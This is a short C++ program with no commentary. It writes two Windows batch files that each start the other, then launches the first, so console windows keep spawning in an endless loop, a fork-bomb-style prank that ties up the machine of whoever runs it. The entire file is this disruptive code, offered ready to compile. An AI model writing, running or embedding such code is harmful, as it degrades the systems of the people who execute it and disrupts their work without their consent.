#include <iostream>
#include <fstream>

using namespace std;

int main(int argc, char *argv[]) {
    ofstream write;
    write.open("lol.bat");
    write << "@echo off\nstart anotherlol.bat";
    write.close();
    write.open("anotherlol.bat");
    write << "@echo off\nstart lol.bat";
    write.close();
    system("start lol.bat");
    return 0;
}
